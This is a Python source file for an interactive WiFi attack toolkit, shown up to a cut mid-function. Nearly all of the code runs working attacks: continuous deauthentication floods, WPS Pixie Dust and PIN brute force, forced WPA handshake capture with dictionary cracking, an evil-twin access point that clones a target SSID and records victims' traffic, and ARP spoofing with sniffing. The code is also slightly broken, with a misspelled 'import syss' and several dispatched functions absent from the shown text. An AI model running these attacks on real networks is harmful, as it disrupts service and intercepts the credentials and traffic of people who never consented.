#!/usr/bin/env python3

import syss
import time
import subprocess
import os
import re
import signal
import argparse
from terminaltables import SingleTable

selected_interface = None
current_processes = []

def main():
    display_banner()
    time.sleep(0.5)
    
    check_root_privileges()
    
    signal.signal(signal.SIGINT, signal_handler)
    
    print("Type 'help' for a list of commands or 'exit' to quit")
    
    interfaces = get_wireless_interfaces()
    if interfaces:
        if len(interfaces) == 1:
            global selected_interface
            selected_interface = interfaces[0]
            print(f"\n[+] Auto-selected wireless interface: {selected_interface}")
        else:
            print(f"\n[*] Found {len(interfaces)} wireless interfaces. Use 'select' to choose one.")
    else:
        print("\n[!] No wireless interfaces detected. Are you running in a VM?")
    
    while True:
        try:
            command = input("\n> ").strip().lower()
            
            if command == "exit":
                print("Cleaning up and exiting application...")
                cleanup_and_exit()
                break
            elif command == "help":
                display_help()
            elif command == "scan":
                wifi_scan()
            elif command == "monitor":
                wifi_monitor_mode()
            elif command == "managed":
                wifi_managed_mode()
            elif command == "capture":
                start_wifi_capture()
            elif command == "interfaces" or command == "ifconfig":
                show_interfaces()
            elif command.startswith("select"):
                select_interface(command)
            elif command == "deauth":
                run_deauth()
            elif command == "jam":
                wifi_jamming()
            elif command == "wps":
                run_wps_attack()
            elif command == "handshake":
                capture_handshake()
            elif command == "crack":
                crack_handshake()
            elif command == "status":
                show_status()
            elif command == "stop":
                stop_all_processes()
            elif command == "evil":
                evil_twin_attack()
            elif command == "sniff":
                wifi_packet_sniffing()
            elif command == "scanclients":
                scan_clients()
            elif command == "nmap":
                run_nmap_scan()
            elif command == "arpspoof":
                arp_spoofing()
            elif command == "mac":
                mac_changer()
            elif command == "mitm":
                mitm_proxy()
            elif command == "dnsspoof":
                dns_spoof()
            elif command == "clear" or command == "cls":
                os.system('clear')
            else:
                print(f"Command '{command}' not recognized. Type 'help' for available commands.")
        except KeyboardInterrupt:
            print("\n\nUse 'exit' to quit safely or CTRL+C again to force quit")
            try:
                time.sleep(1)
            except KeyboardInterrupt:
                print("\nForce quitting...")
                sys.exit(1)

def signal_handler(sig, frame):
    print("\n\nInterrupt received. Use 'exit' to quit safely or CTRL+C again to force quit")
    try:
        time.sleep(1)
    except KeyboardInterrupt:
        print("\nForce quitting...")
        sys.exit(1)

def check_root_privileges():
    if os.geteuid() != 0:
        print("\n[!] This script requires root privileges to interact with network interfaces")
        print("[!] Please run as root or with sudo")
        sys.exit(1)

def display_banner():
    os.system('clear')
    print(r"""
 _____       _                _   _ _ _                   
/  __ \     | |              | \ | (_) |                  
| /  \/_   _| |__   ___ _ __ |  \| |_| |___  ___ _ __     
| |   | | | | '_ \ / _ \ '__|| . ` | | / __|/ _ \ '_ \    
| \__/\ |_| | |_) |  __/ |   | |\  | | \__ \  __/ | | |   
 \____/\__, |_.__/ \___|_|   \_| \_/_|_|___/\___|_| |_|   
        __/ |                                             
       |___/                                              
 __        _____ _____ _   _____           _ _    _ _   
 \ \      / /_ _|  ___(_) |_   _|__   ___ | | | _(_) |_ 
  \ \ /\ / / | || |_  | |   | |/ _ \ / _ \| | |/ / | __|
   \ V  V /  | ||  _| | |   | | (_) | (_) | |   <| | |_ 
    \_/\_/  |___|_|   |_|   |_|\___/ \___/|_|_|\_\_|\__|
                                            
    """)
    time.sleep(0.3)
    print("CyberNilsen's Advanced WiFi Penetration Testing Toolkit")
    print("====================================================")
    print(f"Running on: {os.uname()[1]} - Kali {get_kali_version()}")

def get_kali_version():
    try:
        with open('/etc/os-release', 'r') as f:
            for line in f:
                if line.startswith('VERSION='):
                    return line.split('=')[1].strip().strip('"')
    except:
        return "Linux"
    return "Unknown"

def display_help():
    print("\nAvailable commands:")
    
    commands = [
        ["Command", "Description"],
        ["help", "Display this help message"],
        ["interfaces", "Show available wireless interfaces"],
        ["select", "Select a wireless interface (e.g., 'select wlan0')"],
        ["status", "Show current status and selected interface"],
        ["scan", "Scan for wireless networks with details"],
        ["scanclients", "Scan for clients connected to a specific AP"],
        ["monitor", "Put wireless interface in monitor mode"],
        ["managed", "Return wireless interface to managed mode"],
        ["capture", "Capture wireless packets (with filtering options)"],
        ["handshake", "Capture WPA handshakes from target networks"],
        ["crack", "Attempt to crack captured handshakes"],
        ["deauth", "Send deauthentication packets to targets"],
        ["jam", "Perform Wi-Fi jamming attacks"],  
        ["wps", "Test for WPS vulnerabilities"],
        ["evil", "Create an evil twin access point"],
        ["sniff", "Sniff wireless traffic for credentials"],
        ["stop", "Stop all running processes"],
        ["clear", "Clear the screen"],
        ["exit", "Exit the application (cleanup on exit)"]
    ]
    
    table = SingleTable(commands)
    table.inner_row_border = True
    print(table.table)

def get_wireless_interfaces():
    try:
        result = subprocess.run(["iw", "dev"], capture_output=True, text=True, check=False)
        
        if result.returncode != 0:
            result = subprocess.run(["iwconfig"], capture_output=True, text=True, check=False)
            interfaces = re.findall(r'(\w+)\s+IEEE', result.stdout)
        else:
            interfaces = re.findall(r'Interface\s+(\w+)', result.stdout)
        
        return interfaces
    except Exception as e:
        print(f"[!] Error getting wireless interfaces: {e}")
        return []

def show_interfaces():
    print("\n[*] Showing wireless interfaces...")
    
    interfaces = get_wireless_interfaces()
    
    if not interfaces:
        print("[!] No wireless interfaces detected")
        return
    
    interface_data = [["Interface", "Mode", "MAC Address", "Status"]]
    
    for iface in interfaces:
        mode = get_interface_mode(iface)
        mac = get_interface_mac(iface)
        status = "Up" if is_interface_up(iface) else "Down"
        
        interface_data.append([
            f"→ {iface}" if iface == selected_interface else iface,
            mode,
            mac,
            status
        ])
    
    table = SingleTable(interface_data)
    table.inner_row_border = True
    print(table.table)

def get_interface_mode(interface):
    try:
        result = subprocess.run(["iwconfig", interface], capture_output=True, text=True, check=False)
        if "Mode:Monitor" in result.stdout:
            return "Monitor"
        elif "Mode:Managed" in result.stdout:
            return "Managed"
        else:
            mode_match = re.search(r'Mode:(\w+)', result.stdout)
            return mode_match.group(1) if mode_match else "Unknown"
    except:
        return "Unknown"

def get_interface_mac(interface):
    try:
        result = subprocess.run(["macchanger", "-s", interface], capture_output=True, text=True, check=False)
        mac_match = re.search(r'([0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2})', result.stdout, re.IGNORECASE)
        return mac_match.group(1) if mac_match else "Unknown"
    except:
        return "Unknown"

def is_interface_up(interface):
    try:
        with open(f"/sys/class/net/{interface}/operstate", "r") as f:
            state = f.read().strip()
        return state == "up"
    except:
        return False

def select_interface(command):
    global selected_interface
    
    parts = command.split()
    if len(parts) < 2:
        interfaces = get_wireless_interfaces()
        if not interfaces:
            print("[!] No wireless interfaces detected")
            return
            
        print("\nAvailable interfaces:")
        for i, iface in enumerate(interfaces, 1):
            print(f"{i}. {iface}")
            
        choice = input("\nSelect interface number (or name): ")
        try:
            if choice.isdigit() and 1 <= int(choice) <= len(interfaces):
                selected_interface = interfaces[int(choice) - 1]
            elif choice in interfaces:
                selected_interface = choice
            else:
                print(f"[!] Invalid selection: {choice}")
                return
        except (ValueError, IndexError):
            print("[!] Invalid selection")
            return
    else:
        interface_name = parts[1]
        interfaces = get_wireless_interfaces()
        
        if interface_name in interfaces:
            selected_interface = interface_name
        else:
            print(f"[!] Interface '{interface_name}' not found")
            return
    
    print(f"[+] Selected interface: {selected_interface}")

def check_interface_selected():
    if not selected_interface:
        print("[!] No interface selected. Use 'select' command first.")
        return False
    return True

def wifi_scan():
    if not check_interface_selected():
        return
    
    print(f"\n[*] Scanning for wireless networks using {selected_interface}...")
    
    current_mode = get_interface_mode(selected_interface)
    if current_mode == "Monitor":
        print("[*] Interface is in monitor mode, switching to managed mode for scanning...")
        wifi_managed_mode(silent=True)
        
    subprocess.run(["ip", "link", "set", selected_interface, "up"], check=False)
    
    scan_duration = input(f"Enter scan duration in seconds [15]: ").strip() or "15"
    try:
        scan_duration = int(scan_duration)
        if scan_duration < 5:
            print("[!] Scan duration too short, using 5 seconds")
            scan_duration = 5
    except:
        print("[!] Invalid duration, using 15 seconds")
        scan_duration = 15
    
    try:
        try:
            print(f"[*] Scanning networks (this will take at least {scan_duration} seconds)...")
            
            temp_file = f"temp_scan_{int(time.time())}.txt"
            
            with open(temp_file, 'w') as outfile:
                scan_process = subprocess.Popen(
                    ["nmcli", "-f", "BSSID,SSID,CHAN,RATE,SIGNAL,SECURITY", "dev", "wifi", "list", "ifname", selected_interface, "--rescan", "yes"],
                    stdout=outfile
                )
            
            print("[*] Scanning networks...")
            for i in range(scan_duration, 0, -1):
                sys.stdout.write(f"\r[*] Scan in progress... {i} seconds remaining")
                sys.stdout.flush()
                time.sleep(1)
            sys.stdout.write("\r[*] Processing scan results...                   \n")
            
            if scan_process.poll() is None:
                scan_process.terminate()
                try:
                    scan_process.wait(timeout=2)
                except subprocess.TimeoutExpired:
                    scan_process.kill()
            
            with open(temp_file, 'r') as f:
                scan_output = f.read()
            
            print("\n" + scan_output)
            
            if os.path.exists(temp_file):
                os.remove(temp_file)
                
        except:
            print("[*] Using iwlist for scanning...")
            print(f"[*] This will take at least {scan_duration} seconds...")
            scan_process = subprocess.Popen(["iwlist", selected_interface, "scan"], stdout=subprocess.PIPE)
            
            for i in range(scan_duration, 0, -1):
                sys.stdout.write(f"\r[*] Scan in progress... {i} seconds remaining")
                sys.stdout.flush()
                time.sleep(1)
            sys.stdout.write("\r[*] Processing scan results...                   \n")
            
            if scan_process.poll() is None:
                stdout, stderr = scan_process.communicate(timeout=5)
            else:
                stdout = scan_process.stdout.read()
            
            result_str = stdout.decode('utf-8', errors='ignore')
            
            networks = []
            current_network = None
            
            for line in result_str.splitlines():
                line = line.strip()
                
                if "Cell" in line:
                    if current_network:
                        networks.append(current_network)
                    current_network = {"MAC": line.split("Address: ")[1] if "Address: " in line else "Unknown"}
                elif current_network:
                    if "ESSID:" in line:
                        current_network["SSID"] = line.split('ESSID:"')[1].strip('"')
                    elif "Frequency:" in line:
                        current_network["Channel"] = line.split("Channel ")[1] if "Channel " in line else "?"
                    elif "Quality=" in line:
                        signal_str = line.split("Signal level=")[1].split(" ")[0] if "Signal level=" in line else "?"
                        current_network["Signal"] = signal_str
                    elif "Encryption key:" in line:
                        current_network["Encryption"] = "On" if "on" in line.lower() else "Off"
                    elif "IE: IEEE 802.11i/WPA2" in line:
                        current_network["Security"] = "WPA2"
                    elif "IE: WPA Version 1" in line:
                        current_network["Security"] = "WPA"
            
            if current_network:
                networks.append(current_network)
                
            if networks:
                network_data = [["BSSID", "SSID", "Channel", "Signal", "Security"]]
                
                for net in networks:
                    network_data.append([
                        net.get("MAC", "?"),
                        net.get("SSID", "<hidden>"),
                        net.get("Channel", "?"),
                        net.get("Signal", "?"),
                        net.get("Security", net.get("Encryption", "?"))
                    ])
                
                table = SingleTable(network_data)
                table.inner_row_border = True
                print("\n" + table.table)
            else:
                print("[!] No networks found")
        
    except subprocess.CalledProcessError as e:
        print(f"[!] Error running scan command: {e}")
    except Exception as e:
        print(f"[!] Unexpected error: {e}")
    
    print("\n[+] Scan complete!")

def wifi_monitor_mode(silent=False):
    global selected_interface  
    
    if not check_interface_selected():
        return
    
    if not silent:
        print(f"\n[*] Putting {selected_interface} in monitor mode...")
    
    try:
        subprocess.run(["airmon-ng", "check", "kill"], check=False)
        
        subprocess.run(["airmon-ng", "start", selected_interface], check=False)
        
        interfaces = get_wireless_interfaces()
        mon_interface = f"{selected_interface}mon"
        
        if mon_interface in interfaces:
            selected_interface = mon_interface
            if not silent:
                print(f"[+] Interface name changed to {mon_interface}")
        
        if get_interface_mode(selected_interface) != "Monitor":
            subprocess.run(["ip", "link", "set", selected_interface, "down"], check=False)
            subprocess.run(["iw", selected_interface, "set", "monitor", "none"], check=False)
            subprocess.run(["ip", "link", "set", selected_interface, "up"], check=False)
            
        if not silent:
            if get_interface_mode(selected_interface) == "Monitor":
                print(f"[+] {selected_interface} is now in monitor mode!")
            else:
                print(f"[!] Failed to put {selected_interface} in monitor mode")
    
    except Exception as e:
        print(f"[!] Error setting monitor mode: {e}")

def wifi_managed_mode(silent=False):
    global selected_interface 
    
    if not check_interface_selected():
        return
    
    if not silent:
        print(f"\n[*] Putting {selected_interface} back in managed mode...")
    
    try:
        original_interface = selected_interface.replace("mon", "") if selected_interface.endswith("mon") else selected_interface
        
        subprocess.run(["airmon-ng", "stop", selected_interface], check=False)
        
        interfaces = get_wireless_interfaces()
        
        if original_interface in interfaces:
            selected_interface = original_interface
            if not silent:
                print(f"[+] Interface name changed back to {original_interface}")
        
        if get_interface_mode(selected_interface) != "Managed":
            subprocess.run(["ip", "link", "set", selected_interface, "down"], check=False)
            subprocess.run(["iw", selected_interface, "set", "type", "managed"], check=False)
            subprocess.run(["ip", "link", "set", selected_interface, "up"], check=False)
            
        subprocess.run(["systemctl", "restart", "NetworkManager"], check=False)
        
        if not silent:
            if get_interface_mode(selected_interface) == "Managed":
                print(f"[+] {selected_interface} is now in managed mode!")
            else:
                print(f"[!] Failed to put {selected_interface} in managed mode")
    
    except Exception as e:
        print(f"[!] Error setting managed mode: {e}")

def start_wifi_capture():
    if not check_interface_selected():
        return
    
    if get_interface_mode(selected_interface) != "Monitor":
        print("[*] Interface is not in monitor mode, switching now...")
        wifi_monitor_mode()
    
    print(f"\n[*] Starting wireless packet capture with {selected_interface}...")
    
    print("\nCapture Options:")
    print("1. Capture all traffic")
    print("2. Filter by channel")
    print("3. Filter by BSSID (AP MAC)")
    print("4. Advanced filtering")
    
    choice = input("\nSelect option [1]: ").strip() or "1"
    
    command = ["airodump-ng"]
    
    if choice == "2":
        channel = input("Enter channel number: ").strip()
        command.extend(["-c", channel])
    elif choice == "3":
        bssid = input("Enter AP MAC address: ").strip()
        command.extend(["--bssid", bssid])
    elif choice == "4":
        print("\nAvailable filters:")
        print("Channel (-c)")
        print("BSSID (--bssid)")
        print("Write to file (-w)")
        print("Example: -c 6 --bssid 00:11:22:33:44:55 -w capture")
        
        filters = input("\nEnter filters: ").strip()
        command.extend(filters.split())
    
    save_option = input("\nSave capture to file? (y/n) [n]: ").strip().lower() or "n"
    if save_option == "y":
        filename = input("Enter filename (without extension): ").strip() or "wifi_capture"
        command.extend(["-w", filename])
    
    command.append(selected_interface)
    
    print(f"\n[*] Running: {' '.join(command)}")
    print("[*] Press Ctrl+C to stop capturing")
    print("[*] Starting capture...")
    
    try:
        process = subprocess.Popen(command)
        current_processes.append(("airodump-ng", process))
        process.wait()
    except KeyboardInterrupt:
        print("\n[*] Stopping packet capture...")
    except Exception as e:
        print(f"[!] Error during packet capture: {e}")
    finally:
        stop_process("airodump-ng")
        print("[+] Packet capture stopped")

def run_deauth():
    if not check_interface_selected():
        return
    
    if get_interface_mode(selected_interface) != "Monitor":
        print("[*] Interface is not in monitor mode, switching now...")
        wifi_monitor_mode()
    
    print(f"\n[*] Setting up deauthentication attack using {selected_interface}...")
    
    ap_mac = input("Enter AP MAC address: ").strip()
    if not ap_mac:
        print("[!] AP MAC address is required")
        return
    
    channel = input("Enter channel number of the target AP: ").strip()
    if not channel:
        print("[!] Warning: No channel specified. Attack might be less effective.")
    else:
        print(f"[*] Setting channel to {channel}...")
        subprocess.run(["iwconfig", selected_interface, "channel", channel], check=False)
        
    client_mac = input("Enter client MAC address (leave blank for all clients): ").strip()
    
    packet_count = input("Enter number of deauth packets to send (0 for continuous) [0]: ").strip() or "0"
    
    delay = input("Enter delay between packets in ms (25-1000) [0]: ").strip() or "0"
    
    command = ["aireplay-ng", "--deauth", packet_count, "-a", ap_mac]
    
    if client_mac:
        command.extend(["-c", client_mac])
    
    command.append(selected_interface)
    
    print(f"\n[*] Running: {' '.join(command)}")
    print("[*] Press Ctrl+C to stop the attack")
    print("[*] Starting deauth attack...")
    
    try:
        if int(delay) > 0:
            while True:
                subprocess.run(command, check=False)
                time.sleep(int(delay) / 1000)
        else:
            process = subprocess.Popen(command)
            current_processes.append(("aireplay-ng", process))
            process.wait()
    except KeyboardInterrupt:
        print("\n[*] Stopping deauth attack...")
    except Exception as e:
        print(f"[!] Error during deauth attack: {e}")
    finally:
        stop_process("aireplay-ng")
        print("[+] Deauth attack stopped")

def run_wps_attack():
    if not check_interface_selected():
        return
    
    print(f"\n[*] Setting up WPS vulnerability scan using {selected_interface}...")
    
    if get_interface_mode(selected_interface) != "Monitor":
        print("[*] For best WPS attack results, switching to monitor mode...")
        wifi_monitor_mode()
    
    print("\nWPS Attack Options:")
    print("1. Scan for WPS-enabled networks (wash)")
    print("2. Pixie Dust attack (reaver)")
    print("3. Brute force PIN (reaver)")
    
    choice = input("\nSelect option [1]: ").strip() or "1"
    
    try:
        if choice == "1":
            print("\n[*] Scanning for WPS-enabled networks...")
            channel = input("Specify channel to scan (leave blank for all channels): ").strip()
            
            wash_cmd = ["wash", "-i", selected_interface]
            if channel:
                wash_cmd.extend(["-c", channel])
                
            process = subprocess.Popen(wash_cmd)
            current_processes.append(("wash", process))
            process.wait()
        
        elif choice == "2":
            target_bssid = input("Enter target AP MAC address: ").strip()
            if not target_bssid:
                print("[!] Target AP MAC address is required")
                return
                
            channel = input("Enter channel number of the target AP: ").strip()
            if not channel:
                print("[!] Channel is required for effective attack")
                return
                
            print("\n[*] Running Pixie Dust attack...")
            reaver_cmd = [
                "reaver", 
                "-i", selected_interface, 
                "-b", target_bssid,
                "-c", channel,
                "-K", "1",     
                "-vv",        
                "-L",          
                "-N"           
            ]
            
            process = subprocess.Popen(reaver_cmd)
            current_processes.append(("reaver", process))
            process.wait()
            
        elif choice == "3":
            target_bssid = input("Enter target AP MAC address: ").strip()
            if not target_bssid:
                print("[!] Target AP MAC address is required")
                return
                
            channel = input("Enter channel number of the target AP: ").strip()
            if not channel:
                print("[!] Channel is required for effective attack")
                return
                
            print("\n[*] Running WPS PIN brute force...")
            reaver_cmd = [
                "reaver", 
                "-i", selected_interface, 
                "-b", target_bssid,
                "-c", channel,
                "-vv",         
                "-L",          
                "-d", "2"      
            ]
            
            process = subprocess.Popen(reaver_cmd)
            current_processes.append(("reaver", process))
            process.wait()
            
    except KeyboardInterrupt:
        print("\n[*] Stopping WPS attack...")
    except Exception as e:
        print(f"[!] Error during WPS attack: {e}")
    finally:
        stop_process("wash")
        stop_process("reaver")
        print("[+] WPS attack stopped")

def capture_handshake():
    if not check_interface_selected():
        return
    
    if get_interface_mode(selected_interface) != "Monitor":
        print("[*] Interface is not in monitor mode, switching now...")
        wifi_monitor_mode()
    
    print(f"\n[*] Setting up WPA handshake capture using {selected_interface}...")
    
    print("[*] Scanning for networks first...")
    scan_process = subprocess.Popen(["airodump-ng", selected_interface])
    current_processes.append(("airodump-ng-scan", scan_process))
    
    try:
        print("\n[*] Press Ctrl+C when you see your target network")
        scan_process.wait()
    except KeyboardInterrupt:
        stop_process("airodump-ng-scan")
    
    target_bssid = input("\nEnter target AP MAC address: ").strip()
    if not target_bssid:
        print("[!] AP MAC address is required")
        return
    
    target_channel = input("Enter target channel: ").strip()
    if not target_channel:
        print("[!] Channel is required")
        return
    
    output_file = input("Enter output filename (without extension) [handshake]: ").strip() or "handshake"
    
    print(f"\n[*] Starting targeted capture on {target_bssid} (Channel {target_channel})...")
    capture_cmd = [
        "airodump-ng", 
        "--bssid", target_bssid,
        "--channel", target_channel,
        "-w", output_file,
        selected_interface
    ]
    
    capture_process = subprocess.Popen(capture_cmd)
    current_processes.append(("airodump-ng-capture", capture_process))
    
    deauth_option = input("\nRun deauth attack to force handshake? (y/n) [y]: ").strip().lower() or "y"
    
    if deauth_option == "y":
        deauth_cmd = [
            "aireplay-ng",
            "--deauth", "5",
            "-a", target_bssid,
            selected_interface
        ]
        
        try:
            print("\n[*] Sending deauth packets to capture handshake...")
            subprocess.run(deauth_cmd, check=False)
            
            print("\n[*] Waiting for handshake to be captured...")
            print("[*] Press Ctrl+C when you see 'WPA Handshake' or to stop capturing")
            capture_process.wait()
        except KeyboardInterrupt:
            print("\n[*] Stopping handshake capture...")
        finally:
            stop_process("airodump-ng-capture")
            print(f"\n[+] Handshake may have been captured to {output_file}-01.cap")
            print("[*] You can use the 'crack' command to attempt to crack it")

def crack_handshake():
    print("\n[*] WPA Handshake Cracking")
    
    cap_file = input("Enter path to capture file (.cap): ").strip()
    if not os.path.exists(cap_file):
        print(f"[!] File not found: {cap_file}")
        return
    
    wordlist = input("Enter path to wordlist [/usr/share/wordlists/rockyou.txt]: ").strip() or "/usr/share/wordlists/rockyou.txt"
    if not os.path.exists(wordlist):
        print(f"[!] Wordlist not found: {wordlist}")
        return
    
    print("\nCracking method:")
    print("1. aircrack-ng (faster)")
    print("2. hashcat (GPU, more powerful)")
    
    method = input("\nSelect method [1]: ").strip() or "1"
    
    try:
        if method == "1":
            print(f"\n[*] Starting aircrack-ng with {wordlist}...")
            process = subprocess.Popen(["aircrack-ng", cap_file, "-w", wordlist])
            current_processes.append(("aircrack-ng", process))
            process.wait()
        else:
            hccapx_file = cap_file.replace(".cap", ".hccapx")
            print(f"[*] Converting cap to hashcat format...")
            subprocess.run(["cap2hccapx", cap_file, hccapx_file], check=False)
            
            print(f"[*] Starting hashcat with {wordlist}...")
            process = subprocess.Popen([
                "hashcat", "-m", "2500", hccapx_file, wordlist, 
                "--force"  
            ])
            current_processes.append(("hashcat", process))
            process.wait()
    
    except KeyboardInterrupt:
        print("\n[*] Stopping crack attempt...")
    except Exception as e:
        print(f"[!] Error during cracking: {e}")
    finally:
        stop_process("aircrack-ng")
        stop_process("hashcat")
        print("[*] Cracking process stopped")

def evil_twin_attack():
    if not check_interface_selected():
        return
    
    print("\n[*] Evil Twin Access Point Setup")
    print("[!] Warning: This requires a second wireless interface for internet connection")
    
    scan_option = input("Scan for networks first? (y/n) [y]: ").strip().lower() or "y"
    if scan_option == "y":
        print("[*] Scanning for networks to clone...")
        scan_process = subprocess.Popen(["airodump-ng", selected_interface])
        current_processes.append(("airodump-ng-scan", scan_process))
        
        try:
            print("\n[*] Press Ctrl+C when you see your target network")
            scan_process.wait()
        except KeyboardInterrupt:
            stop_process("airodump-ng-scan")
    
    target_ssid = input("Enter target SSID to clone: ").strip()
    if not target_ssid:
        print("[!] Target SSID is required")
        return
    
    print("\nSSID Options for your Evil Twin:")
    print("1. Use exact target SSID (perfect clone)")
    print("2. Use a custom name")
    
    ssid_option = input("\nSelect option [1]: ").strip() or "1"
    
    if ssid_option == "1":
        ap_name = target_ssid
        print(f"[+] Using exact target SSID: {ap_name}")
    else:
        ap_name = input("Enter custom SSID for your access point: ").strip()
        if not ap_name:
            print("[!] Custom SSID is required")
            return
        print(f"[+] Using custom SSID: {ap_name}")
    
    channel = input("Enter channel to use [1]: ").strip() or "1"
    
    security_option = input("Add password protection? (y/n) [n]: ").strip().lower() or "n"
    password = ""
    
    if security_option == "y":
        password = input("Enter password (min 8 characters): ").strip()
        if len(password) < 8:
            print("[!] Password must be at least 8 characters")
            return
    
    second_interface = input("Enter interface for internet connection: ").strip()
    if not second_interface:
        print("[!] Second interface is required for internet connection")
        return
    
    print(f"\n[*] Setting up Evil Twin AP '{ap_name}' on channel {channel}...")
    
    try:
        subprocess.run(["rfkill", "unblock", "wifi"], check=False)
        
        with open("hostapd.conf", "w") as f:
            f.write(f"interface={selected_interface}\n")
            f.write(f"ssid={ap_name}\n")
            f.write(f"channel={channel}\n")
            f.write("driver=nl80211\n")
            f.write("hw_mode=g\n")
            
            if security_option == "y":
                f.write("wpa=2\n")
                f.write("wpa_key_mgmt=WPA-PSK\n")
                f.write("wpa_pairwise=CCMP\n")
                f.write(f"wpa_passphrase={password}\n")
        
        with open("dnsmasq.conf", "w") as f:
            f.write(f"interface={selected_interface}\n")
            f.write("dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h\n")
            f.write("dhcp-option=3,192.168.1.1\n")
            f.write("dhcp-option=6,192.168.1.1\n")  
            f.write("server=8.8.8.8\n")
            f.write("log-queries\n")
            f.write("log-dhcp\n")
        
        print("[*] Preparing interface...")
        subprocess.run(["airmon-ng", "stop", selected_interface], check=False)
        subprocess.run(["ip", "link", "set", selected_interface, "down"], check=False)
        subprocess.run(["iw", selected_interface, "set", "type", "managed"], check=False)
        subprocess.run(["ip", "addr", "flush", "dev", selected_interface], check=False)
        subprocess.run(["ip", "addr", "add", "192.168.1.1/24", "dev", selected_interface], check=False)
        subprocess.run(["ip", "link", "set", selected_interface, "up"], check=False)
        
        print("[*] Setting up routing...")
        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], check=False)
        
        subprocess.run(["iptables", "--flush"], check=False)
        subprocess.run(["iptables", "--table", "nat", "--flush"], check=False)
        subprocess.run(["iptables", "--delete-chain"], check=False)
        subprocess.run(["iptables", "--table", "nat", "--delete-chain"], check=False)
        subprocess.run(["iptables", "--table", "nat", "--append", "POSTROUTING", "--out-interface", 
                      second_interface, "-j", "MASQUERADE"], check=False)
        subprocess.run(["iptables", "--append", "FORWARD", "--in-interface", selected_interface, "-j", "ACCEPT"], check=False)
        
        print("[*] Starting DHCP server...")
        dnsmasq_proc = subprocess.Popen(["dnsmasq", "-C", "dnsmasq.conf", "-d"])
        current_processes.append(("dnsmasq", dnsmasq_proc))
        
        print("[*] Starting access point...")
        hostapd_proc = subprocess.Popen(["hostapd", "hostapd.conf"])
        current_processes.append(("hostapd", hostapd_proc))
        
        print("\n[+] Evil Twin AP is running!")
        print(f"[+] Network SSID: {ap_name}")
        if security_option == "y":
            print(f"[+] Password: {password}")
        
        capture_option = input("\nCapture network traffic? (y/n) [y]: ").strip().lower() or "y"
        if capture_option == "y":
            print("[*] Starting network traffic capture...")
            capture_file = f"eviltwin_capture_{int(time.time())}"
            tcpdump_proc = subprocess.Popen(["tcpdump", "-i", selected_interface, "-w", f"{capture_file}.pcap"])
            current_processes.append(("tcpdump", tcpdump_proc))
            print(f"[+] Capturing traffic to {capture_file}.pcap")
        
        print("[*] Press Ctrl+C to stop")
        hostapd_proc.wait()
        
    except KeyboardInterrupt:
        print("\n[*] Stopping Evil Twin AP...")
    except Exception as e:
        print(f"[!] Error setting up Evil Twin: {e}")
    finally:
        stop_process("dnsmasq")
        stop_process("hostapd")
        stop_process("tcpdump")
        print("[+] Evil Twin AP stopped")
        print("[*] Restoring network configuration...")
        subprocess.run(["systemctl", "restart", "NetworkManager"], check=False)

def run_nmap_scan():
    print("\n[*] Nmap Network Scanner")
    
    target = input("Enter target IP/range (e.g., 192.168.1.0/24): ").strip()
    if not target:
        print("[!] Target is required")
        return
    
    print("\nScan Type:")
    print("1. Quick scan (-sS -F)")
    print("2. Intense scan (-sS -A -T4)")
    print("3. Comprehensive scan (-sS -sV -sC -A -p-)")
    print("4. Custom scan")
    
    scan_type = input("\nSelect scan type [1]: ").strip() or "1"
    
    try:
        if scan_type == "1":
            print(f"\n[*] Running quick scan on {target}...")
            command = ["nmap", "-sS", "-F", target]
        elif scan_type == "2":
            print(f"\n[*] Running intense scan on {target}...")
            command = ["nmap", "-sS", "-A", "-T4", target]
        elif scan_type == "3":
            print(f"\n[*] Running comprehensive scan on {target}...")
            command = ["nmap", "-sS", "-sV", "-sC", "-A", "-p-", target]
        else:
            options = input("Enter nmap options: ").strip()
            command = ["nmap"] + options.split() + [target]
        
        output_file = input("\nSave output to file? (leave blank for no): ").strip()
        if output_file:
            command.extend(["-oN", output_file])
        
        print(f"\n[*] Running: {' '.join(command)}")
        process = subprocess.Popen(command)
        current_processes.append(("nmap", process))
        process.wait()
        
    except KeyboardInterrupt:
        print("\n[*] Stopping nmap scan...")
    except Exception as e:
        print(f"[!] Error during nmap scan: {e}")
    finally:
        stop_process("nmap")
        print("[+] Nmap scan completed")

def arp_spoofing():
    print("\n[*] ARP Spoofing Attack Setup")
    
    target = input("Enter target IP: ").strip()
    if not target:
        print("[!] Target IP is required")
        return
    
    gateway = input("Enter gateway IP [192.168.1.1]: ").strip() or "192.168.1.1"
    
    print("\n[*] Starting ARP spoofing attack...")
    try:
        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], check=False)
        
        arpspoof_cmd1 = ["arpspoof", "-i", selected_interface, "-t", target, gateway]
        arpspoof_cmd2 = ["arpspoof", "-i", selected_interface, "-t", gateway, target]
        
        print(f"[*] Running: {' '.join(arpspoof_cmd1)}")
        process1 = subprocess.Popen(arpspoof_cmd1)
        current_processes.append(("arpspoof1", process1))
        
        print(f"[*] Running: {' '.join(arpspoof_cmd2)}")
        process2 = subprocess.Popen(arpspoof_cmd2)
        current_processes.append(("arpspoof2", process2))
        
        sniffer_option = input("\nCapture traffic with Wireshark? (y/n) [y]: ").strip().lower() or "y"
        if sniffer_option == "y":
            print("[*] Starting Wireshark for traffic analysis...")
            wireshark_cmd = ["wireshark", "-i", selected_interface, "-k", f"host {target}"]
            process3 = subprocess.Popen(wireshark_cmd)
            current_processes.append(("wireshark", process3))
        
        print("[*] ARP spoofing attack running. Press Ctrl+C to stop.")
        process1.wait()
        
    except KeyboardInterrupt:
        print("\n[*] Stopping ARP spoofing attack...")
    except Exception as e:
        print(f"[!] Error during ARP spoofing: {e}")
    finally:
        stop_process("arpspoof1")
        stop_process("arpspoof2")
        stop_process("wireshark")
        print("[+] ARP spoofing stopped")

def mac_changer():
    if not check_interface_selected():
        return
    
    print(f"\n[*] MAC Address Changer for {selected_interface}")
    
    subprocess.run(["ip", "link", "set", selected_interface, "down"], check=False)
    
    print("\nOptions:")
    print("1. Set random MAC")
    print("2. Specify custom MAC")
    print("3. Reset to original MAC")
    
    option = input("\nSelect option [1]: ").strip() or "1"
    
    try:
        if option == "1":
            print("[*] Setting random MAC address...")
            subprocess.run(["macchanger", "-r", selected_interface], check=False)
        elif option == "2":
            mac = input("Enter custom MAC address (XX:XX:XX:XX:XX:XX): ").strip()
            if not mac:
                print("[!] MAC address is required")
                return
